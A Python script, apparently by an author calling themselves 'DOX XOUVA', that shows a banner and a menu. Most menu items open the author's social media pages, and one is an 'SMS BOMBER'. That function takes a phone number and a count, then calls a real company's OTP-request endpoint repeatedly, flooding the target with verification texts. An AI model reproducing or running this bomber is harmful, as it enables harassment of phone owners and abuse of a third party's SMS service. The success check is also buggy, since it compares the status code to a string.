import os
import sys
r="\033[1;31m"
b="\033[1;35m"
g="\033[1;32m"
w="\033[1;37m"
def logo():
  os.system("clear")
  os.system("""echo ' 
██████   ██████  ██   ██     ██   ██  ██████  ██    ██ ██    ██  █████  
██   ██ ██    ██  ██ ██       ██ ██  ██    ██ ██    ██ ██    ██ ██   ██ 
██   ██ ██    ██   ███         ███   ██    ██ ██    ██ ██    ██ ███████ 
██   ██ ██    ██  ██ ██       ██ ██  ██    ██ ██    ██  ██  ██  ██   ██ 
██████   ██████  ██   ██     ██   ██  ██████   ██████    ████   ██   ██ 

----------------------------------------------------
  ╔════════════════════════════════════════════════╗
  ║              😈 CALL ME DOX XOUVA 😈           ║
  ║             GIVE RESPECT TAKE RESPECT          ║
  ║               I AM NOOB PROGRAMER.             ║
  ╚════════════════════════════════════════════════╝
----------------------------------------------------'|lolcat""")

def sms():
  logo()
  import requests
  number = str(input("ENTER YOUR NUMBER :>> "))
  amount = int(input("ENTER YOUR AMMOUNT :>> "))
  x = "https://students.byjus.com/mobiles/request_otp?mobile=+880-"+number
  for i in range (amount):
    resp = requests.get(x)
    success = (resp.status_code)
    if success == "200":
      print(g+"SENT")
    else:
      print(r+"NOT SENT")
def main():
  logo()
  os.system("echo '\t[1] >> FACEBOOK\n\t[2] >> YOU TUBE\n\t[3] >> FACEBOOK PAGE\n\t[4] >> DOX XOUVA FACEBOOK\n\t[5] >> DOX XOUVA PAGE\n\t[6] >> GITHUB\n\t[7] >> SMS BOMBER\n\t[0] >> EXIT ' | lolcat")
  ()
  inp = str(input(w+"\n\t["+b+"?"+w+"]"+g+" SELECT YOUR OPTION :"+b+" "))
  if inp == "1":
    os.system("xdg-open https://facebook.com/sifat.md.abdur.zahar")
    main()
  elif inp == "2":
    os.system("xdg-open https://youtube.com/channel/UCOkFg-HjdLPmRlJry9MTAxQ")
    main()
  elif inp == "3":
    os.system("xdg-open https://www.facebook.com/azsifat/")
    main()
  elif inp == "4":
    os.system("xdg-open https://www.facebook.com/profile.php?id=100080419151330")
    main()
  elif inp == "5":
    os.system("xdg-open https://www.facebook.com/Dox-Xouva-106673698737366/")
    main()
  elif inp == "6":
    os.system("xdg-open https://github.com/dox-xouva")
    main()
  elif inp == "7":
    sms ()
  elif inp == "0":
    sys.exit()
  else:
    main()
    

if __name__=='__main__':
  main ()  